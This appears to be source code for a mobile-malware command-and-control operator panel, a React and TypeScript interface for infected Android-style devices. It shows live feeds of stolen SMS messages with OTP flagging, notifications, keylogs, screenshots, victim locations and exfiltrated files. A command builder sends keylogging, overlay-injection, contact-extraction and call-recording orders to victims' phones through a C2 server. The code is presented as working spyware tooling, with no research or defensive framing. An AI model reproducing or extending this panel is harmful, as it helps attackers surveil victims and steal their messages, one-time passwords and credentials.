// ===========================================================================
// MINOR: Operator Panel Complete
// Real-time SMS feed, keylog viewer, screen capture display, file browser
// ===========================================================================

// ============== BACKEND API (TypeScript) ==============

// api/devices.ts
export interface Device {
  id: string;
  deviceId: string;
  model: string;
  manufacturer: string;
  osVersion: number;
  firstSeen: Date;
  lastSeen: Date;
  battery: number;
  ipAddress: string;
  country: string;
  isOnline: boolean;
  apps: InstalledApp[];
  capturedData: CapturedData;
}

export interface InstalledApp {
  name: string;
  package: string;
  icon: string;
  version: string;
}

export interface CapturedData {
  smsCount: number;
  notificationCount: number;
  screenshotCount: number;
  keylogEntries: number;
  filesExfiltrated: number;
  contactsStolen: number;
  locationsTracked: number;
}

// ============== FRONTEND COMPONENTS (React/TypeScript) ==============

// Dashboard.tsx
import React, { useEffect, useState } from 'react';
import { LineChart, Line, AreaChart, Area, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';

export const Dashboard: React.FC = () => {
  const [stats, setStats] = useState({
    totalDevices: 0,
    activeDevices: 0,
    totalSMS: 0,
    totalScreenshots: 0,
    totalKeylog: 0,
    totalNotifications: 0,
    dataExfiltrated: '0 GB',
    dataExfiltrationTrend: [] as any[]
  });

  useEffect(() => {
    const ws = new WebSocket('ws://api.c2.local/stats');
    ws.onmessage = (e) => {
      setStats(JSON.parse(e.data));
    };
    return () => ws.close();
  }, []);

  return (
    <div style={{ padding: '20px' }}>
      <h1>C2 Command & Control Dashboard</h1>
      
      {/* KPI Cards */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '20px', marginBottom: '30px' }}>
        <KPICard title="Active Devices" value={stats.activeDevices} />
        <KPICard title="Total Devices" value={stats.totalDevices} />
        <KPICard title="SMS Captured" value={stats.totalSMS} />
        <KPICard title="Data Exfiltrated" value={stats.dataExfiltrated} />
      </div>

      {/* Charts */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
        {/* Device Status Pie Chart */}
        <div style={{ background: '#f5f5f5', padding: '15px', borderRadius: '8px' }}>
          <h3>Device Status</h3>
          <ResponsiveContainer width="100%" height={300}>
            <PieChart>
              <Pie
                data={[
                  { name: 'Online', value: stats.activeDevices },
                  { name: 'Offline', value: stats.totalDevices - stats.activeDevices }
                ]}
                cx="50%"
                cy="50%"
                labelLine={false}
                label={(entry) => `${entry.name}: ${entry.value}`}
                outerRadius={80}
                fill="#8884d8"
                dataKey="value"
              >
                <Cell fill="#4CAF50" />
                <Cell fill="#f44336" />
              </Pie>
            </PieChart>
          </ResponsiveContainer>
        </div>

        {/* Data Exfiltration Trend */}
        <div style={{ background: '#f5f5f5', padding: '15px', borderRadius: '8px' }}>
          <h3>Data Exfiltration Trend (24h)</h3>
          <ResponsiveContainer width="100%" height={300}>
            <AreaChart data={stats.dataExfiltrationTrend}>
              <CartesianGrid strokeDasharray="3 3" />
              <XAxis />
              <YAxis />
              <Tooltip />
              <Area type="monotone" dataKey="bytes" stroke="#8884d8" fill="#8884d8" />
            </AreaChart>
          </ResponsiveContainer>
        </div>
      </div>

      {/* Collection Stats */}
      <div style={{ marginTop: '30px', background: '#f5f5f5', padding: '15px', borderRadius: '8px' }}>
        <h3>Collection Statistics</h3>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px' }}>
          <Stat label="Screenshots" value={stats.totalScreenshots} />
          <Stat label="Keylog Entries" value={stats.totalKeylog} />
          <Stat label="Notifications" value={stats.totalNotifications} />
        </div>
      </div>
    </div>
  );
};

const KPICard: React.FC<{ title: string; value: any }> = ({ title, value }) => (
  <div style={{ background: '#fff', padding: '20px', borderRadius: '8px', boxShadow: '0 2px 8px rgba(0,0,0,0.1)' }}>
    <p style={{ margin: '0 0 10px 0', color: '#666', fontSize: '12px' }}>{title}</p>
    <h2 style={{ margin: 0, fontSize: '28px' }}>{value}</h2>
  </div>
);

const Stat: React.FC<{ label: string; value: any }> = ({ label, value }) => (
  <div>
    <p style={{ margin: 0, fontSize: '12px', color: '#666' }}>{label}</p>
    <p style={{ margin: '5px 0 0 0', fontSize: '20px', fontWeight: 'bold' }}>{value}</p>
  </div>
);

// ============== REAL-TIME FEEDS ==============

// SMSViewer.tsx
export const SMSViewer: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [messages, setMessages] = useState<SMS[]>([]);

  useEffect(() => {
    const ws = new WebSocket(`ws://api.c2.local/device/${deviceId}/sms`);
    ws.onmessage = (e) => {
      const sms: SMS = JSON.parse(e.data);
      setMessages(prev => [sms, ...prev].slice(0, 100)); // Keep last 100
    };
    return () => ws.close();
  }, [deviceId]);

  return (
    <div style={{ padding: '15px' }}>
      <h3>SMS Messages (Real-time)</h3>
      {messages.map((msg, i) => (
        <div key={i} style={{ background: '#f5f5f5', padding: '10px', marginBottom: '10px', borderRadius: '4px' }}>
          <p><strong>From:</strong> {msg.from}</p>
          <p><strong>Message:</strong> {msg.body}</p>
          <p><strong>Time:</strong> {new Date(msg.timestamp).toLocaleTimeString()}</p>
          {msg.isOTP && <p style={{ color: '#f44336', fontWeight: 'bold' }}>⚠ OTP Detected</p>}
        </div>
      ))}
    </div>
  );
};

interface SMS {
  from: string;
  body: string;
  timestamp: number;
  isOTP: boolean;
}

// NotificationFeed.tsx
export const NotificationFeed: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [notifications, setNotifications] = useState<Notification[]>([]);

  useEffect(() => {
    const ws = new WebSocket(`ws://api.c2.local/device/${deviceId}/notifications`);
    ws.onmessage = (e) => {
      const notif: Notification = JSON.parse(e.data);
      setNotifications(prev => [notif, ...prev].slice(0, 100));
    };
    return () => ws.close();
  }, [deviceId]);

  return (
    <div style={{ padding: '15px' }}>
      <h3>Notifications (Real-time)</h3>
      {notifications.map((notif, i) => (
        <div key={i} style={{ background: '#f5f5f5', padding: '10px', marginBottom: '10px', borderRadius: '4px' }}>
          <p><strong>App:</strong> {notif.appName}</p>
          <p><strong>Title:</strong> {notif.title}</p>
          <p><strong>Body:</strong> {notif.body}</p>
          <p><strong>Time:</strong> {new Date(notif.timestamp).toLocaleTimeString()}</p>
        </div>
      ))}
    </div>
  );
};

interface Notification {
  appName: string;
  title: string;
  body: string;
  timestamp: number;
}

// ============== FILE BROWSER ==============

// FileBrowser.tsx
export const FileBrowser: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [files, setFiles] = useState<ExfilFile[]>([]);
  const [currentPath, setCurrentPath] = useState('/');

  useEffect(() => {
    fetch(`http://api.c2.local/device/${deviceId}/files?path=${currentPath}`)
      .then(r => r.json())
      .then(data => setFiles(data));
  }, [deviceId, currentPath]);

  return (
    <div style={{ padding: '15px' }}>
      <h3>Exfiltrated Files: {currentPath}</h3>
      <table style={{ width: '100%', borderCollapse: 'collapse' }}>
        <thead>
          <tr style={{ background: '#f5f5f5' }}>
            <th style={{ border: '1px solid #ddd', padding: '8px', textAlign: 'left' }}>Name</th>
            <th style={{ border: '1px solid #ddd', padding: '8px', textAlign: 'left' }}>Size</th>
            <th style={{ border: '1px solid #ddd', padding: '8px', textAlign: 'left' }}>Modified</th>
            <th style={{ border: '1px solid #ddd', padding: '8px', textAlign: 'left' }}>Action</th>
          </tr>
        </thead>
        <tbody>
          {files.map((file, i) => (
            <tr key={i}>
              <td style={{ border: '1px solid #ddd', padding: '8px' }}>
                {file.isDir ? `📁 ${file.name}` : `📄 ${file.name}`}
              </td>
              <td style={{ border: '1px solid #ddd', padding: '8px' }}>{(file.size / 1024).toFixed(2)} KB</td>
              <td style={{ border: '1px solid #ddd', padding: '8px' }}>{new Date(file.modified).toLocaleString()}</td>
              <td style={{ border: '1px solid #ddd', padding: '8px' }}>
                {file.isDir && <button onClick={() => setCurrentPath(file.path)}>Open</button>}
                {!file.isDir && <a href={`http://api.c2.local/download/${file.id}`}>Download</a>}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

interface ExfilFile {
  id: string;
  name: string;
  path: string;
  size: number;
  modified: number;
  isDir: boolean;
}

// ============== SCREEN CAPTURE VIEWER ==============

// ScreenCaptureViewer.tsx
export const ScreenCaptureViewer: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [screenshot, setScreenshot] = useState<Screenshot | null>(null);
  const [history, setHistory] = useState<Screenshot[]>([]);

  useEffect(() => {
    fetch(`http://api.c2.local/device/${deviceId}/screenshot/latest`)
      .then(r => r.json())
      .then(data => setScreenshot(data));

    fetch(`http://api.c2.local/device/${deviceId}/screenshot/history?limit=20`)
      .then(r => r.json())
      .then(data => setHistory(data));
  }, [deviceId]);

  return (
    <div style={{ padding: '15px' }}>
      <h3>Screen Capture</h3>
      {screenshot && (
        <div style={{ marginBottom: '20px' }}>
          <p><strong>Latest:</strong> {new Date(screenshot.timestamp).toLocaleString()}</p>
          <img src={screenshot.dataUrl} style={{ maxWidth: '100%', border: '1px solid #ddd', borderRadius: '4px' }} />
        </div>
      )}

      <h4>History</h4>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '10px' }}>
        {history.map((ss, i) => (
          <img
            key={i}
            src={ss.dataUrl}
            style={{ width: '100%', cursor: 'pointer', border: '2px solid transparent', borderRadius: '4px' }}
            onClick={() => setScreenshot(ss)}
            title={new Date(ss.timestamp).toLocaleTimeString()}
          />
        ))}
      </div>
    </div>
  );
};

interface Screenshot {
  id: string;
  dataUrl: string;
  timestamp: number;
}

// ============== COMMAND BUILDER ==============

// CommandBuilder.tsx
export const CommandBuilder: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [commandType, setCommandType] = useState('screenshot');
  const [targetApp, setTargetApp] = useState('_default');
  const [result, setResult] = useState('');

  const executeCommand = async () => {
    const response = await fetch('http://api.c2.local/command/execute', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        deviceId,
        commandType,
        targetApp
      })
    });

    const data = await response.json();
    setResult(`Command sent: ${data.id}`);
  };

  return (
    <div style={{ padding: '15px', background: '#f5f5f5', borderRadius: '8px' }}>
      <h3>Execute Command</h3>
      
      <div style={{ marginBottom: '15px' }}>
        <label>Command Type:</label>
        <select value={commandType} onChange={(e) => setCommandType(e.target.value)}>
          <option value="screenshot">Screenshot</option>
          <option value="keylog">Keylog</option>
          <option value="location">Get Location</option>
          <option value="sms">Read SMS</option>
          <option value="contacts">Extract Contacts</option>
          <option value="files">List Files</option>
          <option value="overlay">Inject Overlay</option>
          <option value="call_record">Start Call Recording</option>
        </select>
      </div>

      <div style={{ marginBottom: '15px' }}>
        <label>Target App:</label>
        <input 
          type="text" 
          value={targetApp} 
          onChange={(e) => setTargetApp(e.target.value)}
          placeholder="_default"
          style={{ width: '100%', padding: '8px', borderRadius: '4px', border: '1px solid #ddd' }}
        />
      </div>

      <button 
        onClick={executeCommand}
        style={{
          background: '#4CAF50',
          color: 'white',
          padding: '10px 20px',
          border: 'none',
          borderRadius: '4px',
          cursor: 'pointer'
        }}
      >
        Execute
      </button>

      {result && <p style={{ marginTop: '10px', color: '#4CAF50' }}>{result}</p>}
    </div>
  );
};

// ============== LOCATION MAP ==============

// LocationMap.tsx
export const LocationMap: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [locations, setLocations] = useState<Location[]>([]);

  useEffect(() => {
    fetch(`http://api.c2.local/device/${deviceId}/locations`)
      .then(r => r.json())
      .then(data => setLocations(data));
  }, [deviceId]);

  return (
    <div style={{ padding: '15px' }}>
      <h3>Device Locations ({locations.length})</h3>
      <div id="map" style={{ width: '100%', height: '400px', border: '1px solid #ddd', borderRadius: '4px' }} />
      <div style={{ marginTop: '15px', maxHeight: '300px', overflow: 'auto' }}>
        {locations.map((loc, i) => (
          <div key={i} style={{ background: '#f5f5f5', padding: '10px', marginBottom: '5px', borderRadius: '4px' }}>
            <p><strong>{loc.latitude}, {loc.longitude}</strong></p>
            <p style={{ fontSize: '12px', color: '#666' }}>{new Date(loc.timestamp).toLocaleString()}</p>
          </div>
        ))}
      </div>
    </div>
  );
};

interface Location {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
}

// ============== KEYLOG VIEWER ==============

// KeylogViewer.tsx
export const KeylogViewer: React.FC<{ deviceId: string }> = ({ deviceId }) => {
  const [entries, setEntries] = useState<KeylogEntry[]>([]);
  const [filter, setFilter] = useState('');

  useEffect(() => {
    fetch(`http://api.c2.local/device/${deviceId}/keylog`)
      .then(r => r.json())
      .then(data => setEntries(data));
  }, [deviceId]);

  const filtered = entries.filter(e => 
    e.app.toLowerCase().includes(filter.toLowerCase()) ||
    e.text.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div style={{ padding: '15px' }}>
      <h3>Keylog Entries ({filtered.length})</h3>
      
      <input
        type="text"
        placeholder="Filter by app or text..."
        value={filter}
        onChange={(e) => setFilter(e.target.value)}
        style={{ width: '100%', padding: '8px', marginBottom: '15px', borderRadius: '4px', border: '1px solid #ddd' }}
      />

      <div style={{ maxHeight: '500px', overflow: 'auto' }}>
        {filtered.map((entry, i) => (
          <div key={i} style={{ background: '#f5f5f5', padding: '10px', marginBottom: '10px', borderRadius: '4px' }}>
            <p><strong>[{entry.time}]</strong> <code style={{ background: '#fff', padding: '2px 4px', borderRadius: '2px' }}>{entry.app}</code></p>
            <p style={{ fontFamily: 'monospace', wordBreak: 'break-all' }}>{entry.text}</p>
          </div>
        ))}
      </div>
    </div>
  );
};

interface KeylogEntry {
  app: string;
  text: string;
  time: string;
  isSensitive: boolean;
}
